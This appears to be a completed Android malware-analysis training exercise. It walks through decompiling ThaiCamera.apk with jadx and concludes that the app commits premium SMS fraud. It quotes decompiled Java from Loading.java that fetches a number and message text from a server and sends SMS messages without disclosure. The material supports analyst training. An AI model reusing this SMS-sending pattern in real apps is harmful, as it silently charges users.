# Exercise 2 - Reverse Engineer the DEX

## Goals:

1. Learn to analyze the Java decompilation of the DEX bytecode in jadx to understand what the Android application is doing.
2. Experience 1st hand how Android malware analysts apply reverse engineering to their context

## Context

You are a malware analyst for Android applications. You are concerned that this sample maybe doing premium SMS fraud, meaning that it sends an SMS to a premium phone number without disclosure & user consent. In order to flag as malware, you need to determine if the Android application is:

1. Sending an SMS message, and
2. That SMS message is going to a premium number, and
3. If there is an obvious disclosure, and
4. If the SMS message is only sent to the premium number after user consent.

## Instructions

- [x] ~If jadx is not already started, start jadx by opening the terminal in the VM and running the jadx-gui command in the terminal and open ThaiCamera.apk in the jadx GUI in the same way as in Exercise #1.~ If you haven't already executed it, run `jadx` against `ThaiCamera.apk` in the `samples/ThaiCamera` folder.

- [x] Remember that the manifest is available under “Resources” by clicking on AndroidManifest.xml. To analyze the DEX bytecode, you can ~click on classes under the source code tab to open each class~ browse through the classes under `ThaiCamera/sources`. jadx is a decompiler, rather than a disassembler, so it decompiles the DEX bytecode back to the Java. The decompiled Java will not look exactly the same as when the developer wrote it, however, it’s often pretty close to functionally correct.

- [x] Begin analyzing the classes you identified as starting points in Exercise #1. When I say analyze, it’s as simple as reading each line of decompiled output until you understand what a block of code is doing. Once you understand it, take a step back and evaluate the new information you learned against the questions you’re trying to answer with your analysis (Exercise Context). Then decide where to analyze next. If you come from a Java development background, think about reverse engineering as debugging.

The code in `Loading.java` appears to send SMS messages to a number that is returned from an HTTP request without asking disclosing that it is doing so. Relevant code:

```java
// com/cp/camera/Loading.java L66
JSONObject object = new JSONObject(loginByPost(operator));
this.content = object.getString("content");
this.service = object.getString("service");


// com/cp/camera/Loading.java L129
sendMessage(this.service, this.content);

// com/cp/camera/Loading.java L105
findViewById(R.id.button_sensms).setOnClickListener(new View.OnClickListener() {
    public void onClick(View v) {
        if (Build.VERSION.SDK_INT >= 23) {
            int checkCallPhonePermission = ContextCompat.checkSelfPermission(Loading.this.getApplicationContext(), "android.permission.SEND_SMS");
            if (!Loading.this.videoShare.equals(AppEventsConstants.EVENT_PARAM_VALUE_YES) || checkCallPhonePermission != 0) {
                ActivityCompat.requestPermissions(Loading.this, new String[]{"android.permission.SEND_SMS"}, 1);
            } else if (Loading.this.service != null && Loading.this.content != null) {
                Loading.this.sendMessage(Loading.this.service, Loading.this.content);
            }
        } else if (Loading.this.service != null && Loading.this.content != null) {
            Loading.this.sendMessage(Loading.this.service, Loading.this.content);
        }
    }
});

// com/cp/camera/Loading.java L167
public void sendMessage(String mobile, String content2) {
    Bundle bundle = new Bundle();
    bundle.putString(FirebaseAnalytics.Param.ITEM_NAME, "SEND_SMS");
    this.mFirebaseAnalytics.logEvent(FirebaseAnalytics.Event.SELECT_CONTENT, bundle);
    Intent itSend = new Intent("SENT_HUGE_SMS_ACTION");
    itSend.putExtras(bundle);
    SmsManager sms = SmsManager.getDefault();
    PendingIntent sentintent = PendingIntent.getBroadcast(this, 0, itSend, 134217728);
    try {
        if (content2.length() > 70) {
            for (String msg : sms.divideMessage(content2)) {
                sms.sendTextMessage(mobile, null, msg, sentintent, null);
            }
            return;
        }
        sms.sendTextMessage(mobile, null, content2, sentintent, null);
    } catch (Exception e) {
        SharedPreferences.Editor editor = getSharedPreferences("videoLibrary", 0).edit();
        editor.putString("videoShare", AppEventsConstants.EVENT_PARAM_VALUE_NO);
        editor.apply();
        e.printStackTrace();
    }
}
```

## Conclusion

Yes, the app sends potentially premium messages without asking for permission
